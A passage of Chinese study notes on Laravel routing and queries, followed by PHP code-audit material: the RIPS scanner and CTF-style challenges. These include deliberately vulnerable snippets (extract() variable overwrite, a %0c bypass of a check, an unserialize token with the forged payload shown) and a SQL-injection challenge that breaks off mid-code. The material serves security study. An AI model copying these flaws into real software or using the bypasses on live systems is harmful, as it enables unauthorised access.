$<span style="color: #a0522d;">url</span> = route(<span style="color: #8b2252;">'profile'</span>, [<span style="color: #8b2252;">'id'</span> =&gt; 1, <span style="color: #8b2252;">'photos'</span> =&gt; <span style="color: #8b2252;">'yes'</span>]);

// /user/1/profile?<span style="color: #a0522d;">photos</span>=yes
</pre>
</div>

<p>
技巧：有时，您可能希望为 URL 参数指定请求范围的默认值，例如当前语言环境。 为此，您可以使用<a href="https://laravel.p2hp.com/cndocs/9.x/urls#default-values">URL::defaults</a> 方法。
</p>
</div>
</div>
</div>
<div id="outline-container-h:04a3d8dd-61fe-4c08-a58d-b33e3584242d" class="outline-3">
<h3 id="h:04a3d8dd-61fe-4c08-a58d-b33e3584242d">路由组</h3>
<div class="outline-text-3" id="text-h:04a3d8dd-61fe-4c08-a58d-b33e3584242d">
<p>
<a href="https://laravel.p2hp.com/cndocs/9.x/routing#route-groups">https://laravel.p2hp.com/cndocs/9.x/routing#route-groups</a>
</p>

<p>
路由组允许您共享路由属性，例如中间件，而无需在每个单独的路由上定义这些属性。
</p>

<p>
嵌套组尝试智能地将属性与其父组“合并”。 中间件和 where 条件合并，同时附加名称和前缀。 URI 前缀中的命名空间分隔符和斜杠会在适当的地方自动添加。
</p>
</div>
<div id="outline-container-h:8a37bc32-1404-4187-a1cc-55c3d29fce1a" class="outline-4">
<h4 id="h:8a37bc32-1404-4187-a1cc-55c3d29fce1a">路由中间件</h4>
<div class="outline-text-4" id="text-h:8a37bc32-1404-4187-a1cc-55c3d29fce1a">
<p>
<a href="https://laravel.p2hp.com/cndocs/9.x/routing#route-group-middleware">https://laravel.p2hp.com/cndocs/9.x/routing#route-group-middleware</a>
</p>

<p>
要将 <a href="https://laravel.p2hp.com/cndocs/9.x/middleware">middleware</a> 分配给组内的所有路由，您可以在定义组之前使用 middleware 方法。 中间件按照它们在数组中列出的顺序执行：
</p>

<div class="org-src-container">
<pre class="src src-sh">Route::middleware([<span style="color: #8b2252;">'first'</span>, <span style="color: #8b2252;">'second'</span>])-&gt;group(<span style="color: #a020f0;">function</span> () {
    Route::get(<span style="color: #8b2252;">'/'</span>, <span style="color: #a020f0;">function</span> () {
    // &#20351;&#29992;&#31532;&#19968;&#20010;&#21644;&#31532;&#20108;&#20010;&#20013;&#38388;&#20214;...
     });
    Route::get(<span style="color: #8b2252;">'/user/profile'</span>, <span style="color: #a020f0;">function</span> () {
    // &#20351;&#29992;&#31532;&#19968;&#20010;&#21644;&#31532;&#20108;&#20010;&#20013;&#38388;&#20214;...
     });
});
</pre>
</div>
</div>
</div>
<div id="outline-container-h:17ba9adc-fc2b-4c85-9a19-889494070a33" class="outline-4">
<h4 id="h:17ba9adc-fc2b-4c85-9a19-889494070a33">控制器</h4>
<div class="outline-text-4" id="text-h:17ba9adc-fc2b-4c85-9a19-889494070a33">
<p>
<a href="https://laravel.p2hp.com/cndocs/9.x/routing#route-group-controllers">https://laravel.p2hp.com/cndocs/9.x/routing#route-group-controllers</a>
</p>

<p>
如果一组路由都使用相同的 <a href="https://laravel.p2hp.com/cndocs/9.x/controllers">控制器</a>，您可以使用 controller 方法为组内的所有路由定义公共控制器。 然后，在定义路由时，您只需要提供它们调用的控制器方法：
</p>

<div class="org-src-container">
<pre class="src src-sh">use App\Http\Controllers\OrderController;

Route::controller(OrderController::class)-&gt;group(<span style="color: #a020f0;">function</span> () {
  Route::get(<span style="color: #8b2252;">'/orders/{id}'</span>, <span style="color: #8b2252;">'show'</span>);
  Route::post(<span style="color: #8b2252;">'/orders'</span>, <span style="color: #8b2252;">'store'</span>);
});
</pre>
</div>
</div>
</div>
<div id="outline-container-h:907957d7-b2b1-4ab0-93a5-5fb3fc4e8653" class="outline-4">
<h4 id="h:907957d7-b2b1-4ab0-93a5-5fb3fc4e8653">子域路由</h4>
<div class="outline-text-4" id="text-h:907957d7-b2b1-4ab0-93a5-5fb3fc4e8653">
<p>
<a href="https://laravel.p2hp.com/cndocs/9.x/routing#route-group-subdomain-routing">https://laravel.p2hp.com/cndocs/9.x/routing#route-group-subdomain-routing</a>
</p>

<p>
路由组也可以用来处理子域路由。子域可以像路由 uri 一样被分配路由参数，允许您捕获子域的一部分以便在路由或控制器中使用。 子域可以在定义组之前调用 domain 方法来指定:
</p>

<div class="org-src-container">
<pre class="src src-sh">Route::domain(<span style="color: #8b2252;">'{account}.example.com'</span>)-&gt;group(<span style="color: #a020f0;">function</span> () {
    Route::get(<span style="color: #8b2252;">'user/{id}'</span>, <span style="color: #a020f0;">function</span> ($<span style="color: #a0522d;">account</span>, $<span style="color: #a0522d;">id</span>) {
      //
    });
});
</pre>
</div>

<p>
注意：为了确保子域路由是可以访问的，你应该在注册根域路由之前注册子域路由。这将防止根域路由覆盖具有相同 URI 路径的子域路由。
</p>
</div>
</div>
<div id="outline-container-h:0dfb326a-42f7-4392-91b8-62965608efb0" class="outline-4">
<h4 id="h:0dfb326a-42f7-4392-91b8-62965608efb0">路由前缀</h4>
<div class="outline-text-4" id="text-h:0dfb326a-42f7-4392-91b8-62965608efb0">
<p>
<a href="https://laravel.p2hp.com/cndocs/9.x/routing#route-group-prefixes">https://laravel.p2hp.com/cndocs/9.x/routing#route-group-prefixes</a>
</p>

<p>
prefix 方法可以用给定的 URI 为组中的每个路由做前缀。例如，你可能想要在组内的所有路由 uri 前面加上admin 前缀:
</p>

<div class="org-src-container">
<pre class="src src-sh">Route::prefix(<span style="color: #8b2252;">'admin'</span>)-&gt;group(<span style="color: #a020f0;">function</span> () {
  Route::get(<span style="color: #8b2252;">'/users'</span>, <span style="color: #a020f0;">function</span> () {
  // Matches The <span style="color: #8b2252;">"/admin/users"</span> URL
   });
});
</pre>
</div>
</div>
</div>
<div id="outline-container-h:1e23bfb0-0cb7-425a-893f-7bcad212b7ac" class="outline-4">
<h4 id="h:1e23bfb0-0cb7-425a-893f-7bcad212b7ac">隐式绑定</h4>
<div class="outline-text-4" id="text-h:1e23bfb0-0cb7-425a-893f-7bcad212b7ac">
<p>
<a href="https://laravel.p2hp.com/cndocs/9.x/routing#implicit-binding">https://laravel.p2hp.com/cndocs/9.x/routing#implicit-binding</a>
</p>

<p>
Laravel 自动解析定义在路由或控制器操作中的 Eloquent 模型，其类型提示的变量名称与路由段名称匹配。 例如：
</p>

<div class="org-src-container">
<pre class="src src-sh">use App\Models\User;

Route::get(<span style="color: #8b2252;">'/users/{user}'</span>, <span style="color: #a020f0;">function</span> (User $<span style="color: #a0522d;">user</span>) {
<span style="color: #a020f0;">return</span> $<span style="color: #a0522d;">user</span>-&gt;email;
});
</pre>
</div>

<p>
由于 $user 变量被类型提示为 App\Models\User Eloquent 模型，并且变量名称与 {user} URI 段匹配，Laravel 将自动注入 ID 匹配相应的模型实例 来自请求 URI 的值。 如果在数据库中没有找到匹配的模型实例，将自动生成 404 HTTP 响应。
</p>

<p>
当然，使用控制器方法时也可以使用隐式绑定。 同样，请注意 {user} URI 段与控制器中的 $user 变量匹配，该变量包含 App\Models\User 类型提示：
</p>

<div class="org-src-container">
<pre class="src src-sh">use App\Http\Controllers\UserController;
use App\Models\User;

// Route definition...
Route::get(<span style="color: #8b2252;">'/users/{user}'</span>, [UserController::class, <span style="color: #8b2252;">'show'</span>]);

// Controller method definition...
public <span style="color: #a020f0;">function</span> <span style="color: #0000ff;">show</span>(User $<span style="color: #a0522d;">user</span>) {
  <span style="color: #a020f0;">return</span> view(<span style="color: #8b2252;">'user.profile'</span>, [<span style="color: #8b2252;">'user'</span> =&gt; $<span style="color: #a0522d;">user</span>]);
}
</pre>
</div>

<p>
定义一个包含 {user} 参数的路由：
</p>

<div class="org-src-container">
<pre class="src src-sh">use App\Models\User;

Route::get(<span style="color: #8b2252;">'/users/{user}'</span>, <span style="color: #a020f0;">function</span> (User $<span style="color: #a0522d;">user</span>) {
//
});
</pre>
</div>

<p>
由于我们已将所有 {user} 参数绑定到 App\Models\User 模型，该类的一个实例将被注入到路由中。 因此，例如，对 users/1 的请求将从 ID 为 1 的数据库中注入 User 实例。
</p>

<p>
如果在数据库中没有找到匹配的模型实例，则会自动生成 404 HTTP 响应。
</p>
</div>
</div>
<div id="outline-container-h:ecf8e573-2ba8-45d7-bbc5-ef18cd6a37fd" class="outline-4">
<h4 id="h:ecf8e573-2ba8-45d7-bbc5-ef18cd6a37fd">获取参数</h4>
<div class="outline-text-4" id="text-h:ecf8e573-2ba8-45d7-bbc5-ef18cd6a37fd">
<p>
laravel 通过Illuminate\Http\Request类来处理用户的请求
</p>

<p>
传入的请求实例将由 Laravel <a href="https://laravel.p2hp.com/cndocs/9.x/container">服务容器</a> 自动注入
</p>

<div class="org-src-container">
<pre class="src src-sh">&lt;?php
namespace App\Http\Controllers;
use Illuminate\Http\Request;
class UserController extends Controller
{
   /**
   * &#23384;&#20648;&#19968;&#20010;&#26032;&#29992;&#25143;. *
   * @param \Illuminate\Http\Request $<span style="color: #a0522d;">request</span>
   * @return \Illuminate\Http\Response
   */
   public <span style="color: #a020f0;">function</span> <span style="color: #0000ff;">store</span>(Request $<span style="color: #a0522d;">request</span>)
   {
       $<span style="color: #a0522d;">name</span> = $<span style="color: #a0522d;">request</span>-&gt;input(<span style="color: #8b2252;">'name'</span>);
       //
   }
}
</pre>
</div>

<p>
你可以使用 header 方法从 Illuminate\Http\Request 实例中检索一个请求头。如果请求中不存在该头，将返回 null 。然而， header 方法接受一个可选的第二个参数，如果请求中不存在该头，将返回该参数：
</p>

<div class="org-src-container">
<pre class="src src-sh">$<span style="color: #a0522d;">value</span> = $<span style="color: #a0522d;">request</span>-&gt;header(<span style="color: #8b2252;">'X-Header-Name'</span>);

$<span style="color: #a0522d;">value</span> = $<span style="color: #a0522d;">request</span>-&gt;header(<span style="color: #8b2252;">'X-Header-Name'</span>, <span style="color: #8b2252;">'default'</span>);
</pre>
</div>

<p>
使用一些简单的方法，可以从 Illuminate\Http\Request 实例获取所有的用户输入数据，而不用在意用户使用的是哪种 HTTP 动词。不管是什么 HTTP 动词， input 方法都可以用来获取用户的输入数据：
</p>

<div class="org-src-container">
<pre class="src src-sh">$<span style="color: #a0522d;">name</span> = $<span style="color: #a0522d;">request</span>-&gt;input(<span style="color: #8b2252;">'name'</span>);
</pre>
</div>

<p>
可以将默认值作为第二个参数传递给 input 方法。 如果请求中不存在第一个参数指定的字段的输入值，则将返回此值：
</p>

<div class="org-src-container">
<pre class="src src-sh">$<span style="color: #a0522d;">name</span> = $<span style="color: #a0522d;">request</span>-&gt;input(<span style="color: #8b2252;">'name'</span>, <span style="color: #8b2252;">'Sally'</span>);
</pre>
</div>
</div>
</div>
<div id="outline-container-h:bf55aef1-87cf-4fda-a186-3e0c0b503434" class="outline-4">
<h4 id="h:bf55aef1-87cf-4fda-a186-3e0c0b503434">sql注入</h4>
<div class="outline-text-4" id="text-h:bf55aef1-87cf-4fda-a186-3e0c0b503434">
<p>
原生表达式
</p>

<p>
要创建原始字符串表达式，可以使用 DB facade提供的 raw 方法：
</p>

<div class="org-src-container">
<pre class="src src-sh">$<span style="color: #a0522d;">users</span> = DB::table(<span style="color: #8b2252;">'users'</span>)
    -&gt;select(DB::raw(<span style="color: #8b2252;">'count(*) as user_count, status'</span>))
    -&gt;where(<span style="color: #8b2252;">'status'</span>, <span style="color: #8b2252;">'&lt;&gt;'</span>, 1)
    -&gt;groupBy(<span style="color: #8b2252;">'status'</span>)
    -&gt;get();
</pre>
</div>

<p>
selectRaw 方法可以代替 addSelect(DB::raw(&#x2026;)) 。该方法的第二个参数是可选项，值是一个绑定参数的数组：
</p>

<div class="org-src-container">
<pre class="src src-sh">$<span style="color: #a0522d;">orders</span> = DB::table(<span style="color: #8b2252;">'orders'</span>)
    -&gt;selectRaw(<span style="color: #8b2252;">'price * ? as price_with_tax'</span>, [1.0825])
    -&gt;get();
</pre>
</div>
</div>
<div id="outline-container-h:7fec154d-d9de-461a-b455-41080ee84709" class="outline-5">
<h5 id="h:7fec154d-d9de-461a-b455-41080ee84709">使用命名绑定</h5>
<div class="outline-text-5" id="text-h:7fec154d-d9de-461a-b455-41080ee84709">
<p>
除了使用 ? 表示参数绑定外，你还可以使用命名绑定的形式来执行一个查询：
</p>

<div class="org-src-container">
<pre class="src src-sh">$<span style="color: #a0522d;">results</span> = DB::select(<span style="color: #8b2252;">'select * from users where id = :id'</span>, [<span style="color: #8b2252;">'id'</span> =&gt; 1]);
</pre>
</div>
</div>
</div>
<div id="outline-container-h:c1e95214-4df4-4640-a234-63d0eae07124" class="outline-5">
<h5 id="h:c1e95214-4df4-4640-a234-63d0eae07124">执行 Insert 语句</h5>
<div class="outline-text-5" id="text-h:c1e95214-4df4-4640-a234-63d0eae07124">
<p>
你可以使用 DB Facade 的 insert 方法来执行 insert 语句。跟 select 方法一样，该方法的第一个和第二个参数分别是原生 SQL 语句和绑定的数据：
</p>

<div class="org-src-container">
<pre class="src src-sh">use Illuminate\Support\Facades\DB;

DB::insert(<span style="color: #8b2252;">'insert into users (id, name) values (?, ?)'</span>, [1, <span style="color: #8b2252;">'Marc'</span>]);
</pre>
</div>
</div>
</div>
<div id="outline-container-h:0ee1d1d9-06ca-432c-bf53-458c9c0a216f" class="outline-5">
<h5 id="h:0ee1d1d9-06ca-432c-bf53-458c9c0a216f">执行 Update 语句</h5>
<div class="outline-text-5" id="text-h:0ee1d1d9-06ca-432c-bf53-458c9c0a216f">
<p>
update 方法用于更新数据库中现有的记录。该方法将会返回受到本次操作影响的记录行数：
</p>

<div class="org-src-container">
<pre class="src src-sh">use Illuminate\Support\Facades\DB;
$<span style="color: #a0522d;">affected</span> = DB::update(
<span style="color: #8b2252;">'update users set votes = 100 where name = ?'</span>,
 [<span style="color: #8b2252;">'Anita'</span>]
);
</pre>
</div>

<p>
Laravel测试项目
</p>

<div class="org-src-container">
<pre class="src src-sh">git clone https://github.com/cretueusebiu/laravel-web-push-demo.git
<span style="color: #483d8b;">cd</span> laravel-web-push-demo
cp .env.example .env
composer install
</pre>
</div>
</div>
</div>
</div>
</div>
</section>
<section id="outline-container-h:6f632ee6-0858-439f-adfe-ba0999bcae1d" class="outline-2">
<h2 id="h:6f632ee6-0858-439f-adfe-ba0999bcae1d">PHP 函数精讲</h2>
<div class="outline-text-2" id="text-h:6f632ee6-0858-439f-adfe-ba0999bcae1d">
</div>
<div id="outline-container-h:3da5cf8c-4e2d-4af9-896a-fc66765a21a9" class="outline-3">
<h3 id="h:3da5cf8c-4e2d-4af9-896a-fc66765a21a9">php代码审计工具</h3>
<div class="outline-text-3" id="text-h:3da5cf8c-4e2d-4af9-896a-fc66765a21a9">
</div>
<div id="outline-container-h:494e4e59-7166-4d71-baec-7ce5ff6479ac" class="outline-4">
<h4 id="h:494e4e59-7166-4d71-baec-7ce5ff6479ac">RIPS</h4>
<div class="outline-text-4" id="text-h:494e4e59-7166-4d71-baec-7ce5ff6479ac">
<p>
PHP脚本漏洞的静态源代码分析器。由于是对单个文件做数据流分析，但对php框架代码、大型文件分析有难度，所以现在很少用
</p>

<p>
安装：
</p>
<ul class="org-ul">
<li>下载地址： <a href="https://rips-scanner.sourceforge.net/#download">https://rips-scanner.sourceforge.net/#download</a></li>
<li>将所有文件提取到本地网络服务器文档根目录（例如/var/www/rips/）转到 <a href="http://localhost/rips/">http://localhost/rips/</a> 并开始扫描。
<ul class="org-ul">
<li>如windows安装phpstudy，放到工作目录</li>
</ul></li>
</ul>

<p>
界面说明：
</p>
<ul class="org-ul">
<li>subdirs：扫描所有子目录。</li>
<li>verbosity level：选择扫描结果的详细程度，缺省为1(建议就使用1)。</li>
<li>vuln type：选择需要扫描的漏洞类型。支持命令注入、代码执行、SQL注入等十余种漏洞类型，缺省为全部扫描。</li>
<li>code style：选择扫描结果的显示风格（支持9种语法高亮）。</li>
<li>/regex/：使用正则表达式过滤结果。</li>
</ul>

<p>
使用说明：
</p>
<ul class="org-ul">
<li>输入目录后可以查看扫描结果。 如在phpstudy 安装dvwa项目，在path地址栏中输入dvwa目录路径</li>
<li>点击右上角 <code>user input</code> 可以查看web输入，从详情中可以观察到数据流。</li>
</ul>

<p>
所有开发语言自带AST(抽象语法树)功能，它带了数据流关系，我们自己写代码分析源码中的数据流时可以使用AST实现。类似
</p>

<div class="org-src-container">
<pre class="src src-sh">import xxx.ast.parse
   parse(file)
</pre>
</div>

<p>
现在主流代码解析引擎也用AST，这是个基础的东西，同时还要有：
</p>
<ul class="org-ul">
<li>单文件分析</li>
<li>跨文件补充起来</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-h:fc9fd758-a334-4012-ab6f-1c73f72bd736" class="outline-3">
<h3 id="h:fc9fd758-a334-4012-ab6f-1c73f72bd736">1 extract变量覆盖</h3>
<div class="outline-text-3" id="text-h:fc9fd758-a334-4012-ab6f-1c73f72bd736">
<p>
PHP extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。
</p>

<p>
<a href="http://127.0.0.1/extract_vul.php?student=&amp;xxx=1">http://127.0.0.1/extract_vul.php?student=&amp;xxx=1</a>
</p>

<div class="org-src-container">
<pre class="src src-sh">&lt;?php
$<span style="color: #a0522d;">xxx</span> = <span style="color: #8b2252;">'extract_file.txt'</span>;
<span style="color: #0000ff;">extract</span>($<span style="color: #a0522d;">_GET</span>);
<span style="color: #a020f0;">if</span> (isset($<span style="color: #a0522d;">student</span>)) { //&#21028;&#26029;&#21464;&#37327;&#26159;&#21542;&#20026;&#31354;
  $<span style="color: #a0522d;">content</span> = trim(file_get_contents($<span style="color: #a0522d;">xxx</span>)); //&#35835;&#25991;&#20214;
  <span style="color: #a020f0;">if</span> ($<span style="color: #a0522d;">student</span> == $<span style="color: #a0522d;">content</span>) {
    <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">'www.xxx.com'</span>;
 } <span style="color: #a020f0;">else</span> {
    <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">'ERROR'</span>;
 }
}
&lt;?php
</pre>
</div>

<p>
经过 extract() 函数后，会自动解析所有参数，并按照对应 key=value 的方式进行赋值，因此，当我们输入代码中预定义好的变量名时，变量的值会被覆盖。
</p>

<p>
在上例中，将xxx参数进行重新赋值，由于找不到对应文件，所以 $content 变量为空，student变量不给他赋值，那么这时就可以满足其中的 if ($student == $content) 条件。
</p>
</div>
</div>
<div id="outline-container-h:2b4f28de-9731-426d-9d8b-1b1b21e1f139" class="outline-3">
<h3 id="h:2b4f28de-9731-426d-9d8b-1b1b21e1f139">2 绕过过滤的空白字符</h3>
<div class="outline-text-3" id="text-h:2b4f28de-9731-426d-9d8b-1b1b21e1f139">
<p>
可以引入\f（也就是%0c）在数字前面，来绕过最后那个is_palindrome_number函数，而对于前面的数字判断，因为intval会忽略这个字符，所以不会影响。
</p>

<ol class="org-ol">
<li>要求 $req['number']==strval(intval($req['number']))</li>
<li>要求intval($req['number']) == intval(strrev($req['number']))</li>
<li>is_palindrome_number()返回False，这个条件只要在一个回文数比如191前面加一个字符即可实现</li>
</ol>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #a020f0;">function</span> <span style="color: #0000ff;">is_palindrome_number</span>($<span style="color: #a0522d;">number</span>) {
  $<span style="color: #a0522d;">number</span> = strval($<span style="color: #a0522d;">number</span>); //strval &#8212; &#33719;&#21462;&#21464;&#37327;&#30340;&#23383;&#31526;&#20018;&#20540;
  $<span style="color: #a0522d;">i</span> = 0;
  $<span style="color: #a0522d;">j</span> = strlen($<span style="color: #a0522d;">number</span>) - 1; //strlen &#8212; &#33719;&#21462;&#23383;&#31526;&#20018;&#38271;&#24230;
  <span style="color: #a020f0;">while</span>($<span style="color: #a0522d;">i</span> &lt; $<span style="color: #a0522d;">j</span>) {
    <span style="color: #a020f0;">if</span>($<span style="color: #a0522d;">number</span>[$<span style="color: #a0522d;">i</span>] !== $<span style="color: #a0522d;">number</span>[$<span style="color: #a0522d;">j</span>]) {
      <span style="color: #a020f0;">return</span> false;
   }
    $<span style="color: #a0522d;">i</span>++;
    $<span style="color: #a0522d;">j</span>--;
 }
  <span style="color: #a020f0;">return</span> true;
}
<span style="color: #b22222;"># </span><span style="color: #b22222;">trim() &#20989;&#25968;&#31227;&#38500;&#23383;&#31526;&#20018;&#20004;&#20391;&#30340;&#31354;&#30333;&#23383;&#31526;&#25110;&#20854;&#20182;&#39044;&#23450;&#20041;&#23383;&#31526;</span>
$<span style="color: #a0522d;">a</span> = trim($<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'number'</span>]);
<span style="color: #0000ff;">var_dump</span>(($<span style="color: #a0522d;">a</span>==strval(intval($<span style="color: #a0522d;">a</span>)))&amp;
(intval($<span style="color: #a0522d;">a</span>)==intval(strrev($<span style="color: #a0522d;">a</span>)))&amp;!is_palindrome_number($<span style="color: #a0522d;">a</span>));
<span style="color: #b22222;"># </span><span style="color: #b22222;">var_dump() &#20989;&#25968;&#29992;&#20110;&#36755;&#20986;&#21464;&#37327;&#30340;&#30456;&#20851;&#20449;&#24687;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">intval() &#20989;&#25968;&#29992;&#20110;&#33719;&#21462;&#21464;&#37327;&#30340;&#25972;&#25968;&#20540;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">strval() &#20989;&#25968;&#29992;&#20110;&#33719;&#21462;&#21464;&#37327;&#30340;&#23383;&#31526;&#20018;&#20540;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">strrev() &#20989;&#25968;&#21453;&#36716;&#23383;&#31526;&#20018;</span>
?&gt;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:711d094a-e2bc-474c-bad3-87542bdfc469" class="outline-3">
<h3 id="h:711d094a-e2bc-474c-bad3-87542bdfc469">3 多重加密</h3>
<div class="outline-text-3" id="text-h:711d094a-e2bc-474c-bad3-87542bdfc469">
<div class="org-src-container">
<pre class="src src-sh">&lt;?php
  include <span style="color: #8b2252;">'common.php'</span>;
  $<span style="color: #a0522d;">requset</span> = array_merge($<span style="color: #a0522d;">_GET</span>, $<span style="color: #a0522d;">_POST</span>, $<span style="color: #a0522d;">_SESSION</span>, $<span style="color: #a0522d;">_COOKIE</span>);
  //&#25226;&#19968;&#20010;&#25110;&#22810;&#20010;&#25968;&#32452;&#21512;&#24182;&#20026;&#19968;&#20010;&#25968;&#32452;
  class db
 {
    public $<span style="color: #a0522d;">where</span>;
    <span style="color: #a020f0;">function</span> <span style="color: #0000ff;">__wakeup</span>()
   {
      <span style="color: #a020f0;">if</span>(!empty($<span style="color: #a0522d;">this</span>-&gt;where))
     {
        $<span style="color: #a0522d;">this</span>-&gt;select($<span style="color: #a0522d;">this</span>-&gt;where);
     }
   }
    <span style="color: #a020f0;">function</span> <span style="color: #0000ff;">select</span>($<span style="color: #a0522d;">where</span>)
   {
      $<span style="color: #a0522d;">sql</span> = mysql_query(<span style="color: #8b2252;">'select * from user where '</span>.$<span style="color: #a0522d;">where</span>);
      //&#20989;&#25968;&#25191;&#34892;&#19968;&#26465; MySQL &#26597;&#35810;&#12290;
      <span style="color: #a020f0;">return</span> @mysql_fetch_array($<span style="color: #a0522d;">sql</span>);
      //&#20174;&#32467;&#26524;&#38598;&#20013;&#21462;&#24471;&#19968;&#34892;&#20316;&#20026;&#20851;&#32852;&#25968;&#32452;&#65292;&#25110;&#25968;&#23383;&#25968;&#32452;&#65292;&#25110;&#20108;&#32773;&#20860;&#26377;&#36820;&#22238;&#26681;&#25454;&#20174;&#32467;&#26524;&#38598;&#21462;&#24471;&#30340;&#34892;&#29983;&#25104;&#30340;&#25968;&#32452;&#65292;&#22914;&#26524;&#27809;&#26377;&#26356;&#22810;&#34892;&#21017;&#36820;&#22238; false
   }
 }
  <span style="color: #a020f0;">if</span>(isset($<span style="color: #a0522d;">requset</span>[<span style="color: #8b2252;">'token'</span>]))
  //&#27979;&#35797;&#21464;&#37327;&#26159;&#21542;&#24050;&#32463;&#37197;&#32622;&#12290;&#33509;&#21464;&#37327;&#24050;&#23384;&#22312;&#21017;&#36820;&#22238; true &#20540;&#12290;&#20854;&#23427;&#24773;&#24418;&#36820;&#22238; false &#20540;&#12290;
 {
    $<span style="color: #a0522d;">login</span> = unserialize(gzuncompress(base64_decode($<span style="color: #a0522d;">requset</span>[<span style="color: #8b2252;">'token'</span>])));
    //gzuncompress:&#36827;&#34892;&#23383;&#31526;&#20018;&#35299;&#21387;&#32553;
    //unserialize: &#23558;&#24050;&#24207;&#21015;&#21270;&#30340;&#23383;&#31526;&#20018;&#36824;&#21407;&#22238; PHP &#30340;&#20540;
    $<span style="color: #a0522d;">db</span> = new db();
    $<span style="color: #a0522d;">row</span> = $<span style="color: #a0522d;">db</span>-&gt;select(<span style="color: #8b2252;">'user=\''.mysql_real_escape_string($login['</span>user<span style="color: #8b2252;">']).'\'');</span>
<span style="color: #8b2252;">    //mysql_real_escape_string() &#20989;&#25968;&#36716;&#20041; SQL &#35821;&#21477;&#20013;&#20351;&#29992;&#30340;&#23383;&#31526;&#20018;&#20013;&#30340;&#29305;&#27530;&#23383;&#31526;&#12290;</span>
<span style="color: #8b2252;">    if($login['</span>user<span style="color: #8b2252;">'] === '</span>xxx<span style="color: #8b2252;">')</span>
<span style="color: #8b2252;">   {</span>
<span style="color: #8b2252;">      echo $flag;</span>
<span style="color: #8b2252;">   }else if($row['</span>pass<span style="color: #8b2252;">'] !== $login['</span>pass<span style="color: #8b2252;">']){</span>
<span style="color: #8b2252;">      echo '</span>unserialize injection!!<span style="color: #8b2252;">';</span>
<span style="color: #8b2252;">   }else{</span>
<span style="color: #8b2252;">      echo "(&#9583;&#8245;&#9633;&#8242;)&#9583;&#65077;&#9524;&#9472;&#9524; ";</span>
<span style="color: #8b2252;">   }</span>
<span style="color: #8b2252;"> }else{</span>
<span style="color: #8b2252;">    header('</span>Location: index.php?<span style="color: #a0522d;">error</span>=1<span style="color: #8b2252;">');</span>
<span style="color: #8b2252;"> }</span>
<span style="color: #8b2252;">?&gt;</span>
</pre>
</div>

<p>
<code>$login = unserialize(gzuncompress(base64_decode($requset['token'])));</code>
</p>

<p>
可以看到，需要拿到token，之后进行 <b>base64解码-&gt;字符串解压缩-&gt;反序列化</b> ，最终拿到变量 user 的值进行判
断，如果等于 xxx 则成功拿到 flag，那么我们的思路就是将上面的编码过程进行逆转 <b>base64加密-&gt;字符串压缩-&gt;序列化</b> 。
</p>

<p>
因此可以得到如下payload：
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;?php
$<span style="color: #a0522d;">arr</span> = array(<span style="color: #8b2252;">'user'</span> =&gt; <span style="color: #8b2252;">'xxx'</span>);
$<span style="color: #a0522d;">token</span> = base64_encode(gzcompress(serialize($<span style="color: #a0522d;">arr</span>)));
<span style="color: #0000ff;">print_r</span>($<span style="color: #a0522d;">token</span>);
</pre>
</div>

<p>
eJxLtDK0qi62MrFSKi1OLVKyLrYys1LKTUxPTSlVsq4FAI3UCWc=
</p>
</div>
</div>
<div id="outline-container-h:4f0227fc-8b2c-41ab-8ac8-c3e308dda9d1" class="outline-3">
<h3 id="h:4f0227fc-8b2c-41ab-8ac8-c3e308dda9d1">4 SQL注入_WITH ROLLUP绕过</h3>
<div class="outline-text-3" id="text-h:4f0227fc-8b2c-41ab-8ac8-c3e308dda9d1">
<div class="org-src-container">
<pre class="src src-sh">&lt;?php
<span style="color: #0000ff;">error_reporting</span>(0);
<span style="color: #a020f0;">if</span> (!isset($<span style="color: #a0522d;">_POST</span>[<span style="color: #8b2252;">'uname'</span>]) || !isset($<span style="color: #a0522d;">_POST</span>[<span style="color: #8b2252;">'pwd'</span>])) {
  <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">'&lt;form action="" method="post"&gt;'</span>.<span style="color: #8b2252;">"&lt;br/&gt;"</span>;
  <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">'&lt;input name="uname" type="text"/&gt;'</span>.<span style="color: #8b2252;">"&lt;br/&gt;"</span>;
  <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">'&lt;input name="pwd" type="text"/&gt;'</span>.<span style="color: #8b2252;">"&lt;br/&gt;"</span>;
  <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">'&lt;input type="submit" /&gt;'</span>.<span style="color: #8b2252;">"&lt;br/&gt;"</span>;
  <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">'&lt;/form&gt;'</span>.<span style="color: #8b2252;">"&lt;br/&gt;"</span>;
  <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">'&lt;!--source: source.txt--&gt;'</span>.<span style="color: #8b2252;">"&lt;br/&gt;"</span>;
  die;
}
<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">AttackFilter</span>($<span style="color: #a0522d;">StrKey</span>,$<span style="color: #a0522d;">StrValue</span>,$<span style="color: #a0522d;">ArrReq</span>){ 
  <span style="color: #a020f0;">if</span> (is_array($<span style="color: #a0522d;">StrValue</span>)){
//&#26816;&#27979;&#21464;&#37327;&#26159;&#21542;&#26159;&#25968;&#32452;
    $<span style="color: #a0522d;">StrValue</span>=implode($<span style="color: #a0522d;">StrValue</span>);
//&#36820;&#22238;&#30001;&#25968;&#32452;&#20803;&#32032;&#32452;&#21512;&#25104;&#30340;&#23383;&#31526;&#20018;
 }
  <span style="color: #a020f0;">if</span> (preg_match(<span style="color: #8b2252;">"/"</span>.$<span style="color: #a0522d;">ArrReq</span>.<span style="color: #8b2252;">"/is"</span>,$<span style="color: #a0522d;">StrValue</span>)==1){ 
//&#21305;&#37197;&#25104;&#21151;&#19968;&#27425;&#21518;&#23601;&#20250;&#20572;&#27490;&#21305;&#37197;
    print <span style="color: #8b2252;">"xxx_error&#65281;"</span>;
    <span style="color: #a020f0;">exit</span>();
 }
}
